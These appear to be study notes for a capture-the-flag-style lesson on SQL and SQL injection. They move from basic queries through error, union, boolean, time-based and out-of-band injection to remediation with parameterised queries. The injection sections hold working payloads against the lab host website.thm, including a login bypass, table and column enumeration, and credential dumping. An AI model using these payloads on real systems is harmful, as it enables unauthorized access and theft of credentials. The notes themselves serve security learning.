# SQL & SQL Injection

## 🗄️ Databases — Fundamentals

### What Is a Database?

A **database** is an organised electronic collection of data, controlled by a **DBMS** (Database Management System). The two main categories are:

| Type | Description | Examples |
|------|-------------|---------|
| **Relational** | Stores data in structured tables with rows and columns — tables reference each other via keys | MySQL, PostgreSQL, Microsoft SQL Server, SQLite |
| **Non-Relational (NoSQL)** | No fixed table structure — each record can have different fields, more flexible | MongoDB, Cassandra, ElasticSearch |

> This room focuses on **relational databases**. Relational databases use a **primary key** (a unique ID per row) to link tables together — creating relationships between datasets.

### Tables, Columns & Rows

| Component | Description |
|-----------|-------------|
| **Table** | A named grid of data — like a spreadsheet tab |
| **Column (Field)** | Defines the type of data stored — integers, strings, dates, etc. A column with **auto-increment** generates a unique ID for each new row (primary key) |
| **Row (Record)** | A single entry of data — one row = one record |

---

## 📋 SQL — Structured Query Language

SQL is used to interact with relational databases — retrieving, inserting, updating, and deleting data. SQL syntax is **not case-sensitive**.

---

### SELECT — Retrieve Data

```sql
-- Return all columns from the users table
SELECT * FROM users;

-- Return only specific columns
SELECT username, password FROM users;

-- Limit results — return only 1 row
SELECT * FROM users LIMIT 1;

-- Skip 1 result, return 1 row
SELECT * FROM users LIMIT 1,1;
```

### WHERE — Filter Results

```sql
-- Exact match
SELECT * FROM users WHERE username='admin';

-- Not equal
SELECT * FROM users WHERE username != 'admin';

-- OR condition
SELECT * FROM users WHERE username='admin' OR username='jon';

-- AND condition
SELECT * FROM users WHERE username='admin' AND password='p4ssword';
```

### LIKE — Pattern Matching

Uses `%` as a wildcard:

```sql
-- Starts with 'a'
SELECT * FROM users WHERE username LIKE 'a%';

-- Ends with 'n'
SELECT * FROM users WHERE username LIKE '%n';

-- Contains 'mi'
SELECT * FROM users WHERE username LIKE '%mi%';
```

---

### INSERT — Add Data

```sql
INSERT INTO users (username, password) VALUES ('bob', 'password123');
```

---

### UPDATE — Modify Data

```sql
UPDATE users SET username='root', password='pass123' WHERE username='admin';
```

> Always include a `WHERE` clause — without it, every row in the table is updated.

---

### DELETE — Remove Data

```sql
-- Delete specific row
DELETE FROM users WHERE username='martin';

-- Delete ALL rows (no WHERE clause)
DELETE FROM users;
```

---

### UNION — Combine Results

`UNION` combines results from two `SELECT` statements. Rules:
- Same number of columns in each `SELECT`
- Columns must be of compatible data types
- Column order must match

```sql
SELECT name, address, city, postcode FROM customers
UNION
SELECT company, address, city, postcode FROM suppliers;
```

---

## 💉 SQL Injection

**SQL Injection (SQLi)** occurs when user-supplied input is included in a SQL query without sanitisation — allowing an attacker to manipulate the query logic.

| Character | Effect |
|-----------|--------|
| `;` | Terminates the current SQL statement |
| `--` | Comments out everything after it — the rest of the query is ignored |
| `'` or `"` | Breaks string delimiters — used to detect and exploit injection points |

**Detection:** Inject a single quote `'` or double quote `"` into an input field. If the application returns a database error, SQLi is likely present.

---

## 📥 In-Band SQLi

Results are returned directly through the same communication channel used to inject — the most straightforward type to exploit.

---

### Error-Based SQLi

Database error messages are printed to the browser — revealing table names, column names, and query structure.

**How to discover:**
```
Input: '
Result: You have an error in your SQL syntax...  ← SQLi confirmed
```

---

### Union-Based SQLi

Uses the `UNION` operator to append additional `SELECT` statements and extract data from other tables.

**Step-by-step exploitation:**

**Step 1 — Find the number of columns:**
```
https://website.thm/article?id=0 UNION SELECT 1,2,3
```
Try increasing the column count until no error is returned.

**Step 2 — Identify which columns are displayed:**
```
https://website.thm/article?id=0 UNION SELECT 1,2,3
```
Note which numbers appear on the page — these are the columns you can extract data through.

**Step 3 — Get the database name:**
```sql
https://website.thm/article?id=0 UNION SELECT 1,2,database()
```

**Step 4 — List all tables in the database:**
```sql
0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema = 'sqli_one'
```

**Step 5 — Get column names from a table:**
```sql
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_name = 'staff_users'
```

**Step 6 — Extract the data:**
```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>')
FROM staff_users
```

> **`information_schema`** is a built-in MySQL database that contains metadata about all other databases, tables, and columns — the attacker's map of the entire database server.

---

## 🔵 Blind SQLi

No data or error messages are returned directly — the attacker infers results from the application's behaviour.

---

### Authentication Bypass

The simplest blind SQLi — manipulating a login query to return true regardless of credentials.

```
Username: admin
Password: ' OR 1=1; --
```

The resulting query becomes:
```sql
SELECT * FROM users WHERE username='admin' AND password='' OR 1=1;--
```
`1=1` is always true — the `WHERE` clause passes and the login succeeds.

---

### Boolean-Based SQLi

Sends queries that produce a binary outcome — the page behaves differently for `true` vs `false`. Attacker extracts data one character at a time.

**Step-by-step — extract database name:**

```sql
-- Check if the database name matches any pattern (returns true)
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--

-- Test first character
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--

-- Test first two characters
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sq%';--

-- Continue until full name is found
```

**Find tables:**
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables
WHERE table_schema = 'sqli_three' AND table_name LIKE 'a%';--
```

**Find columns:**
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS
WHERE TABLE_SCHEMA='sqli_three' AND TABLE_NAME='users' AND COLUMN_NAME LIKE 'a%';--
```

**Find username:**
```sql
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--
```

**Find password for known username:**
```sql
admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE 'a%';--
```

> Boolean-based SQLi is slow — each query reveals only one bit of information (true/false). Extracting a full password requires testing every character position across every possible character. Tools like **SQLMap** automate this process.

---

### Time-Based SQLi

No visual difference between true and false — success is inferred from response **time**. Uses `SLEEP(x)` which executes only if the preceding condition is true.

**Step-by-step:**

```sql
-- Detect number of columns — SLEEP executes if condition is true
admin123' UNION SELECT SLEEP(5);--

-- Add columns until SLEEP fires (5-second delay = correct column count)
admin123' UNION SELECT SLEEP(5),2;--

-- Extract database name one character at a time
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'u%';--
```

> If the response takes 5 seconds, the condition is true. If it responds immediately, false. Same enumeration process as boolean-based — just with timing instead of a visible indicator.

---

## 📡 Out-of-Band SQLi

Uses a **separate communication channel** to exfiltrate data — the attacker doesn't see results in the page response at all.

```
1. Attacker sends a request to the website with a malicious SQL payload
2. The database executes the payload
3. The payload forces the database server to make an HTTP or DNS request
   back to the attacker's server — carrying the extracted data
4. Attacker captures the request on their server
```

> Out-of-band SQLi is less common — it requires the database server to have network access and the ability to make outbound requests (e.g. via `LOAD_FILE()`, `UTL_HTTP` in Oracle, or `xp_cmdshell` in MSSQL).

---

## 🛡️ Remediation

| Method | Description |
|--------|-------------|
| **Prepared statements with parameterised queries** | The query structure is defined first — user input is added as a typed parameter afterwards and never interpreted as SQL. The most effective defence |
| **Input validation (allowlist)** | Define exactly what valid input looks like and reject anything else — e.g. only allow alphanumeric characters for a username |
| **Escape user input** | Prepend `\` to special characters (`'`, `"`, `$`, `\`) so they are treated as literal strings rather than SQL syntax |
| **Least privilege** | The database account used by the application should have only the permissions it needs — no `DROP`, no access to `information_schema` |
| **Disable detailed error messages** | Never expose raw database errors to the user — log them server-side only |

```sql
-- ❌ Vulnerable — user input concatenated directly into query
$query = "SELECT * FROM users WHERE username='" . $username . "'";

-- ✅ Safe — parameterised query, input treated as data not SQL
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```
